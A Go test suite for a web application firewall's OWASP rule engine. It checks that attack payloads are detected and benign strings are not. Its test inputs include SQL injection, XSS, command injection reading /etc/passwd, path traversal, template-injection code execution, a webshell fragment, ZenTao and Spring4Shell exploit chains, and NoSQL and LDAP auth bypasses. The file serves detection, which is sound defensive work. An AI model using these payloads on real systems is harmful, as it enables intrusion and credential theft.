func TestNormalize_HTMLEntity(t *testing.T) {
	input := "&#60;script&#62;alert(1)&#60;/script&#62;"
	result := normalize(input)
	if !strings.Contains(result, "<script>") {
		t.Fatalf("expected HTML entities decoded, got %q", result)
	}
}

func TestNormalize_Base64Decode(t *testing.T) {
	input := "e3sgMzMzMSozMzMwIH19"
	result := normalizeWithDecode(input)
	if !strings.Contains(result, "3331*3330") {
		t.Fatalf("expected base64 decoded content, got %q", result)
	}
}

// SQLi：ORDER BY 枚举后接注释
func TestCheckOWASP_SQLi_OrderBy(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 order by 5-- -", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for ORDER BY with comment terminator")
	}
}

// SQLi：MySQL 行内注释绕过 /*!50000union*/
func TestCheckOWASP_SQLi_InlineComment(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 /*!50000union*/ select * from users", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for MySQL inline comment bypass")
	}
}

// SQLi：用 SUBSTR 做盲注提取（与 UNION 组合以贴近真实载荷）
func TestCheckOWASP_SQLi_SubstrBlind(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 and substr((select password from users),1,1)='a'-- ", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for SUBSTR blind extraction")
	}
}

// SQLi：条件盲注 IF(select...)
func TestCheckOWASP_SQLi_ConditionalBlind(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=if(ascii(substr(user(),1,1))=114,1,0)", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for conditional blind SQLi")
	}
}

// XSS：带 ontoggle 的 <details>
func TestCheckOWASP_XSS_DetailsOnToggle(t *testing.T) {
	hits := CheckOWASP("mid", "/", `q=<details open ontoggle=alert(1)>`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for details ontoggle")
	}
}

// XSS：<form action=javascript:>
func TestCheckOWASP_XSS_FormJavascript(t *testing.T) {
	hits := CheckOWASP("mid", "/", `q=<form action="javascript:alert(1)">`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for form javascript action")
	}
}

// XSS：String.fromCharCode 绕过
func TestCheckOWASP_XSS_FromCharCode(t *testing.T) {
	hits := CheckOWASP("mid", "/", `q=String.fromCharCode(60,115,99,114,105,112,116,62)`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for fromCharCode")
	}
}

// XSS：带 src 的 <embed>
func TestCheckOWASP_XSS_Embed(t *testing.T) {
	hits := CheckOWASP("high", "/", `q=<embed src="javascript:alert(1)">`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for embed tag")
	}
}

// XSS：<base href> 注入
func TestCheckOWASP_XSS_BaseHref(t *testing.T) {
	hits := CheckOWASP("high", "/", `q=<base href="https://evil.com/">`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for base href injection")
	}
}

// 命令注入：${IFS} 空格绕过
func TestCheckOWASP_CmdInject_IFS(t *testing.T) {
	hits := CheckOWASP("mid", "/", "cmd=cat${IFS}/etc/passwd", nil, nil)
	if !hasCategory(hits, CatCmdInject) && !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected cmd injection or path traversal hit for ${IFS}")
	}
}

// 命令注入：用 && 串联
func TestCheckOWASP_CmdInject_DoubleAmpersand(t *testing.T) {
	hits := CheckOWASP("mid", "/", "input=test&&whoami", nil, nil)
	if !hasCategory(hits, CatCmdInject) {
		t.Fatal("expected cmd injection hit for && chaining")
	}
}

// 命令注入：jQuery 选择器不得触发
func TestCheckOWASP_CmdInject_CleanJQuery(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{`$(document).ready(function(){})`})
	if hasCategory(hits, CatCmdInject) {
		t.Fatal("jQuery $(document) should not trigger cmd injection")
	}
}

// 命令注入：带类选择器的 jQuery 不得触发
func TestCheckOWASP_CmdInject_CleanJQuerySelector(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{`$(".my-class").hide()`})
	if hasCategory(hits, CatCmdInject) {
		t.Fatal("jQuery class selector should not trigger cmd injection")
	}
}

// 路径遍历：Tomcat ..;/ 绕过
func TestCheckOWASP_PathTrav_TomcatBypass(t *testing.T) {
	hits := CheckOWASP("mid", "/..;/..;/WEB-INF/web.xml", "", nil, nil)
	if !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected path traversal hit for Tomcat ..;/ bypass")
	}
}

// 路径遍历：/proc/self/environ
func TestCheckOWASP_PathTrav_ProcSelf(t *testing.T) {
	hits := CheckOWASP("mid", "/", "file=/proc/self/environ", nil, nil)
	if !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected path traversal hit for /proc/self/environ")
	}
}

// 路径遍历：overlong UTF-8 编码的点号
func TestCheckOWASP_PathTrav_OverlongUTF8(t *testing.T) {
	hits := CheckOWASP("mid", "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "", nil, nil)
	if !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected path traversal hit for overlong UTF-8 encoded dots")
	}
}

// SSTI：Python __subclasses__ 遍历
func TestCheckOWASP_SSTI_Subclasses(t *testing.T) {
	hits := CheckOWASP("mid", "/", `name={{''.__class__.__mro__[2].__subclasses__()}}`, nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("expected SSTI hit for __subclasses__")
	}
}

// SSTI：Smarty {php} 标签
func TestCheckOWASP_SSTI_SmartyPHP(t *testing.T) {
	hits := CheckOWASP("mid", "/", `tpl={php}system("id");{/php}`, nil, nil)
	if !hasCategory(hits, CatTmplInject) || !hasCategory(hits, CatWebshell) {
		// 应触发 SSTI 或 webshell 其中之一
		if !hasCategory(hits, CatTmplInject) && !hasCategory(hits, CatWebshell) {
			t.Fatal("expected SSTI or webshell hit for Smarty {php}")
		}
	}
}

// SSTI：Python __builtins__.__import__
func TestCheckOWASP_SSTI_PythonDunder(t *testing.T) {
	// 该载荷可能触发 webshell（因 popen）或 SSTI（因 __builtins__）
	hits := CheckOWASP("mid", "/", `name={{request.__class__.__builtins__.__import__('os').popen('id')}}`, nil, nil)
	if !hasCategory(hits, CatTmplInject) && !hasCategory(hits, CatWebshell) {
		t.Fatal("expected SSTI or webshell hit for Python dunder import")
	}
}

// SSRF：IPv6 映射的私网地址
func TestCheckOWASP_SSRF_IPv6Mapped(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=http://[::ffff:127.0.0.1]/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for IPv6-mapped localhost")
	}
}

// SSRF：十进制 IP 编码
func TestCheckOWASP_SSRF_DecimalIP(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=http://2130706433/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for decimal-encoded IP")
	}
}

// 反序列化：.NET BinaryFormatter
func TestCheckOWASP_Deser_DotNet(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"AAEAAAD//wEAAAA="})
	if !hasCategory(hits, CatDeserial) {
		t.Fatal("expected deserialization hit for .NET BinaryFormatter magic")
	}
}

func TestHasDeserializationIndicatorSkipsPlainColonText(t *testing.T) {
	samples := []string{
		"https://example.com/path",
		"resource.c-ctrip.com load success",
		"params: value",
	}
	for _, sample := range samples {
		if hasDeserializationIndicator(sample) {
			t.Fatalf("plain text should not trigger deserialization indicator: %q", sample)
		}
	}
}

func TestCheckOWASP_Deser_PHPSerializedStringPair(t *testing.T) {
	hits := CheckOWASP("mid", "/vulnerabilities/sqli/", `id=s%3A3%3A%22key%22%3Bs%3A5%3A%22value%22`, nil, nil)
	if !hasCategory(hits, CatDeserial) {
		t.Fatalf("expected deserialization hit for PHP serialized string pair, got %+v", hits)
	}
}

func TestHasDeserializationIndicatorKeepsPHPSerializedObject(t *testing.T) {
	if !hasDeserializationIndicator(`o:8:"stdclass":0:{}`) {
		t.Fatal("expected PHP serialized object indicator")
	}
}

// NoSQL：this.password 比较
func TestCheckOWASP_NoSQLi_ThisPassword(t *testing.T) {
	hits := CheckOWASP("mid", "/api/login", `filter={"$where": "this.password == 'test'"}`, nil, nil)
	if !hasCategory(hits, CatNoSQLi) {
		t.Fatal("expected NoSQL injection hit for this.password comparison")
	}
}

// SSTI：Handlebars {{each}} 助手不应触发（合法模板语法）
func TestCheckOWASP_Clean_HandlebarsHelpers(t *testing.T) {
	body := "{{each user.items}}{{this.name}}{{/each}}"
	hits := CheckOWASP("mid", "/", "", nil, []string{body})
	if hasCategory(hits, CatTmplInject) {
		t.Fatalf("Handlebars {{each}} helper should not trigger SSTI at mid sensitivity, got %+v", hits)
	}
}

// SSTI：Handlebars {{log}} 不应触发
func TestCheckOWASP_Clean_HandlebarsLog(t *testing.T) {
	body := "{{log 'debug message' this}}"
	hits := CheckOWASP("mid", "/", "", nil, []string{body})
	if hasCategory(hits, CatTmplInject) {
		t.Fatalf("Handlebars {{log}} should not trigger SSTI, got %+v", hits)
	}
}

// SSTI：数学表达式注入仍然检出（{{7*7}}）
func TestCheckOWASP_SSTI_MathExpr(t *testing.T) {
	hits := CheckOWASP("mid", "/", "name={{7*7}}", nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("{{7*7}} math expression should still trigger SSTI")
	}
}

// SSTI：Python类链仍然检出
func TestCheckOWASP_SSTI_PythonClass(t *testing.T) {
	hits := CheckOWASP("mid", "/", `x={{''.__class__.__mro__}}`, nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("Python class chain should still trigger SSTI")
	}
}

// 辅助函数

func TestCheckOWASP_LDAP_AuthBypassVariant(t *testing.T) {
	hits := CheckOWASP("mid", "/login", "user=*)(|(uid=*)(mail=*))", nil, nil)
	if !hasCategory(hits, CatLDAPI) {
		t.Fatal("expected LDAP injection hit for auth bypass variant")
	}
}

func TestCheckOWASP_NoSQLi_QueryArrayOperator(t *testing.T) {
	hits := CheckOWASP("mid", "/api/users", "username[$ne]=admin", nil, nil)
	if !hasCategory(hits, CatNoSQLi) {
		t.Fatal("expected NoSQL injection hit for query operator array syntax")
	}
}

func TestCheckOWASP_NoSQLi_JSONKeyOperator(t *testing.T) {
	hits := CheckOWASP("mid", "/api/login", `{"username":{"$regex":".*"},"password":{"$ne":null}}`, nil, nil)
	if !hasCategory(hits, CatNoSQLi) {
		t.Fatal("expected NoSQL injection hit for JSON key operator syntax")
	}
}

func TestCheckOWASP_Clean_BacktickVersionString(t *testing.T) {
	hits := CheckOWASP("high", "/UnifiedIDMPortal/ajaxHandler/common/dev", "reflushCode=0.3988039699917554&cVersion=UP_CAS_6.11.0.100_live", nil, nil)
	if hasCategory(hits, CatCmdInject) {
		t.Fatalf("benign version string containing CAS should not trigger cmd injection, got %+v", hits)
	}
}

// TestCmdInjectionNewPatterns 覆盖 cmd:025-034 每条新增规则的 1 正 1 负用例。
// 正向用 "mid" 敏感度保证总分越过阈值；负向覆盖同形态的良性上下文（表不变量）。
func TestCmdInjectionNewPatterns(t *testing.T) {
	tests := []struct {
		id  string
		pos string
		neg string
	}{
		{id: "owasp:cmd:025", pos: "x=who$@ami", neg: "email=user$@example.com"},
		{id: "owasp:cmd:026", pos: "cmd=ls${IFS}-la", neg: "a=b&&c=d"},
		{id: "owasp:cmd:027", pos: "cmd=export -f whoami;whoami", neg: "export-market-careers"},
		{id: "owasp:cmd:028", pos: "cmd=env -i python -c 'import os'", neg: "env-ios-device"},
		{id: "owasp:cmd:029", pos: "cmd=w'h'o'a'm'i", neg: "v=1;id=123"},
		{id: "owasp:cmd:030", pos: "cmd=curl -s localhost:8000/x.sh", neg: "url=localhost:8000"},
		{id: "owasp:cmd:031", pos: "cmd=$(/bin/cat /etc/passwd)", neg: "$(document).ready()"},
		{id: "owasp:cmd:032", pos: `cmd=$'\x63\x61\x74\x20/etc/passwd'`, neg: `s='\x6'`},
		{id: "owasp:cmd:033", pos: "cmd=xargs sh -c 'id'", neg: "q=xargs -n1"},
		{id: "owasp:cmd:034", pos: "cmd=powershell -enc JABzAA==", neg: "v=cmd.exe.version"},
	}
	for _, tt := range tests {
		// 正例必须至少命中一次 cmd_injection 类别（阈值已由单条分值越过）
		posHit := CheckOWASP("mid", "/cmd", tt.pos, nil, nil)
		if !hasCategory(posHit, CatCmdInject) {
			t.Errorf("%s: positive %q should contain cmd_injection hit, got=%+v", tt.id, tt.pos, posHit)
		}
		// 负例必须不触发 cmd 注入
		negHit := CheckOWASP("mid", "/api", tt.neg, nil, nil)
		if hasCategory(negHit, CatCmdInject) {
			t.Errorf("%s: negative %q false positive, hits=%+v", tt.id, tt.neg, negHit)
		}
	}
}

// WebShell：Python `__import__` 反射导入执行族（Jinja2/SSTI 载荷同样命中）。
// 否定例确认纯 Python 文件名、常规 import 语句与哨兵词本身不产生误报。
func TestCheckOWASP_Webshell_PythonDunderImport(t *testing.T) {
	positive := `cmd=__import__('os').system('id')`
	if hits := CheckOWASP("mid", "/", positive, nil, nil); !hasCategory(hits, CatWebshell) {
		t.Fatal("expected webshell hit for __import__('os') payload")
	}

	negatives := []string{
		"file=python_file.py",
		"code=import os; print(123)",
		"code=from os import path",
		"flag=export IMPORT_DB=1",
		"name=__import__",
	}
	for _, neg := range negatives {
		// CheckOWASP 只返回首个命中/软命中类别；此处仅断言负样本不落入 WebShell 类别。
		if hits := CheckOWASP("mid", "/", neg, nil, nil); hasCategory(hits, CatWebshell) {
			t.Fatalf("unexpected webshell hit for negative sample %q: %+v", neg, hits)
		}
	}
}

func hasCategory(hits []OWASPHit, cat OWASPCategory) bool {
	for _, h := range hits {
		if h.Category == cat {
			return true
		}
	}
	return false
}

func hasRuleID(hits []OWASPHit, ruleID string) bool {
	for _, h := range hits {
		if h.RuleID == ruleID {
			return true
		}
	}
	return false
}

// TestWebshell028BareShellExecLock 锁定 webshell:028 的「shell_exec 裸词」
// 判据：参数名/参数值直接出现 shell_exec（一句话木马待拼接形态）必须命中，
// 而含 shell_exec 子串的普通标识符（myshell_executor）不得误报。
func TestWebshell028BareShellExecLock(t *testing.T) {
	positives := []string{
		"x=shell_exec",
		"shell_exec",
		"x=Shell_Exec&y=1",
		"x=shell_exec($_GET[cmd])",
	}
	for _, q := range positives {
		if hits := CheckOWASP("mid", "/forum.php", q, nil, nil); !hasCategory(hits, CatWebshell) {
			t.Fatalf("shell_exec 裸词 %q 未触发 webshell 命中：%+v", q, hits)
		}
	}
	negatives := []string{
		"x=myshell_executor",
		"name=shell_executor_v2",
	}
	for _, q := range negatives {
		if hits := CheckOWASP("mid", "/forum.php", q, nil, nil); hasCategory(hits, CatWebshell) {
			t.Fatalf("含 shell_exec 子串的正常标识符 %q 不应触发 webshell：%+v", q, hits)
		}
	}
}

// TestSQLi001UnionSelectFunctionCallLock 锁定 union select 后紧跟函数调用
// （md5()/concat()/…）的注入形态必须命中 sqlq:001，不再被误报抑制器当作
// 白样本抑制。该形态是全语料统计中「黑 95 / 白 0」的强信号。
func TestSQLi001UnionSelectFunctionCallLock(t *testing.T) {
	positives := []string{
		"id=-1+union+select+md5(999999999)%23",
		"id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5(205420457)%29%23",
		"id=1 union select database()",
		"id=1 union select user()",
	}
	for _, q := range positives {
		hits := CheckOWASP("mid", "/index.php", q, nil, nil)
		if len(hits) == 0 {
			t.Fatalf("union select 函数调用载荷 %q 未检出", q)
		}
	}
	negatives := []string{
		"m=Goods&a=showcate&id=103",
		"id=1&name=union",
		"q=select a from b",
	}
	for _, q := range negatives {
		if hits := CheckOWASP("mid", "/index.php", q, nil, nil); len(hits) > 0 {
			t.Fatalf("正常查询 %q 不应检出：%+v", q, hits)
		}
	}
}

// TestDeser018FnStreamGadgetLock 锁定 PHP 反序列化链的 Guzzle FnStream gadget：
// Craft CMS CVE-2023-41892 一族的 JSON body 以 __class=GuzzleHttp\Psr7\FnStream
// 触发对象注入。类名只出现在攻击载荷与库源码中，全语料黑 97 / 白 0。
func TestDeser018FnStreamGadgetLock(t *testing.T) {
	positives := []string{
		`GuzzleHttp\Psr7\FnStream`,
		`GuzzleHttp\\Psr7\\FnStream`,
		`guzzlehttp\psr7\fnstream`,
	}
	for _, body := range positives {
		if hits := CheckOWASP("mid", "/index.php", "", nil, []string{body}); len(hits) == 0 {
			t.Fatalf("FnStream gadget %q 未检出", body)
		}
	}
	negatives := []string{
		`craft\behaviors\FieldLayoutBehavior`,
		`GuzzleHttp\Psr7\Stream`,
	}
	for _, body := range negatives {
		if hits := CheckOWASP("mid", "/index.php", "", nil, []string{body}); len(hits) > 0 {
			t.Fatalf("非 gadget 目标 %q 不应检出：%+v", body, hits)
		}
	}
}

// TestDeser019ConstructMethodLock 锁定 ThinkPHP _method=__construct 过滤器注入：
// 表单值恰为 __construct（PHP 魔术方法名），正常业务参数值不会使用。
// 全语料黑 13 / 白 0。
func TestDeser019ConstructMethodLock(t *testing.T) {
	if hits := CheckOWASP("mid", "/index.php", "", nil, []string{"__construct"}); len(hits) == 0 {
		t.Fatal("__construct 表单值未检出")
	}
	for _, v := range []string{"__construct()", "constructor", "construct"} {
		if hits := CheckOWASP("mid", "/index.php", "", nil, []string{v}); len(hits) > 0 {
			t.Fatalf("正常取值 %q 不应检出：%+v", v, hits)
		}
	}
}

// TestPathTrav020DotSegmentWebInfLock 锁定点段前缀绕过的 Java Web 配置访问：
// /.//WEB-INF、./WEB-INF 用 /./ 或 .// 替代 ../ 规避上级目录规则。
// 全语料黑 17 / 白 0。
func TestPathTrav020DotSegmentWebInfLock(t *testing.T) {
	positives := []string{
		"/.//WEB-INF/classes/META-INF/microprofile-config.properties",
		"/./WEB-INF/web.xml",
		".//WEB-INF/web.xml",
	}
	for _, p := range positives {
		if hits := CheckOWASP("mid", p, "", nil, nil); len(hits) == 0 {
			t.Fatalf("点段前缀 WEB-INF 路径 %q 未检出", p)
		}
	}
	for _, p := range []string{"/app/./webinf/x", "/static/WEB-INF-notes.html"} {
		if hits := CheckOWASP("mid", p, "", nil, nil); len(hits) > 0 {
			t.Fatalf("正常路径 %q 不应检出：%+v", p, hits)
		}
	}
}

// TestCmd041ScmWriteFileLock 锁定 SCM 客户端参数注入写 webshell：
// ZenTao 的 SCM=Subversion&client=echo <串>// > ../../www/x.txt 利用链。
// 该 target 不含分隔符与等号，依赖 hasCmdIndicator 的「> + ../ + 命令词」分支。
// 全语料黑 16 / 白 0。
func TestCmd041ScmWriteFileLock(t *testing.T) {
	payload := `echo b115b3cbb909069ea10a84091d4069e7// > ../../www/igwehpwlgx.txt --`
	if hits := CheckOWASP("mid", "/repo-edit-10000-10000.html", "", nil, []string{payload}); len(hits) == 0 {
		t.Fatal("SCM 写文件载荷未检出")
	}
	for _, v := range []string{"Subversion", "SCM", "echo hello world", "../../www/index.html"} {
		if hits := CheckOWASP("mid", "/repo-edit-10000-10000.html", "", nil, []string{v}); len(hits) > 0 {
			t.Fatalf("正常取值 %q 不应检出：%+v", v, hits)
		}
	}
}

// TestEL015Spring4ShellClassLoaderLock 锁定 Spring4Shell（CVE-2022-22965）
// 的 class.module.classLoader.resources 数据绑定链：
//   - URL query 形态（configFile 外带请求）与 Tomcat AccessLogValve 写文件形态；
//   - 请求体表单形态（同一属性链提交在 body 中）。
//
// 反例覆盖侦察阶段常见的空探针 `class.module.classLoader.DefaultAssertionStatus=`，
// 该形态不含 resources 节点，不构成利用链，不应计入误报。
// 全语料黑 46 / 白 0。
func TestEL015Spring4ShellClassLoaderLock(t *testing.T) {
	queryCases := []string{
		"class.module.classLoader.resources.context.configFile=http://oast.example/x&class.module.classLoader.resources.context.configFile.content.a=xxx",
		"class.module.classLoader.resources.context.parent.appBase=./&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
	}
	for _, q := range queryCases {
		if hits := CheckOWASP("mid", "/", q, nil, nil); len(hits) == 0 {
			t.Fatalf("Spring4Shell query 载荷 %q 未检出", q)
		}
	}
	body := "class.module.classLoader.resources.context.configFile=https://oast.example/y&class.module.classLoader.resources.context.configFile.content.aaa=xxx"
	if hits := CheckOWASP("mid", "/", "", nil, []string{body}); len(hits) == 0 {
		t.Fatalf("Spring4Shell 表单载荷 %q 未检出", body)
	}
	// class.classLoader.resources 等价形态（无 module 段）。
	if hits := CheckOWASP("mid", "/", "class.classLoader.resources.context.configFile=http://oast.example/z", nil, nil); len(hits) == 0 {
		t.Fatal("class.classLoader.resources 等价形态未检出")
	}
	for _, q := range []string{
		"class.module.classLoader.DefaultAssertionStatus=",
		"class.module.classLoader.DefaultAssertionStatus=xjm",
		"class=com.example.Demo",
		"classLoader=app",
	} {
		if hits := CheckOWASP("mid", "/", q, nil, nil); len(hits) > 0 {
			t.Fatalf("非利用链取参 %q 不应检出：%+v", q, hits)
		}
	}
}

// TestDeser001JavaSerializationMagicLock 锁定 Java 原生序列化流头的字节级检测：
// 归一化会剥离 NUL 字节（0xAC 0xED 0x00 0x05 → 0xAC 0xED 0x05），
// deser:001 在归一化串上永远匹配不到，必须在原始目标上判定。
// 覆盖 JBoss EJBInvokerServlet / JMXInvokerServlet / WebLogic 反序列化载荷。
func TestDeser001JavaSerializationMagicLock(t *testing.T) {
	// 真实载荷形态：流头 + HashMap + 反射 gadget 类名。
	payload := "\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x00\x00\x00\x00\x00\x00\x01\x00\x00xq\x00~\x00\x01"
	for _, sens := range []string{"mid", "strict"} {
		hits := CheckOWASP(sens, "/probe", "", nil, []string{payload})
		found := false
		for _, h := range hits {
			if h.RuleID == "owasp:deser:001" {
				found = true
			}
		}
		if !found {
			t.Fatalf("sens=%s 下 Java 序列化流头未检出 deser:001：%+v", sens, hits)
		}
	}
	// 反例：把流头里的 NUL 去掉后的纯文本形式不是序列化流。
	for _, body := range []string{"aced05", "aced0005 is hex text", "sro11javautilHashMap"} {
		hits := CheckOWASP("mid", "/probe", "", nil, []string{body})
		for _, h := range hits {
			if h.RuleID == "owasp:deser:001" {
				t.Fatalf("非序列化流目标 %q 误命中 deser:001", body)
			}
		}
	}
}
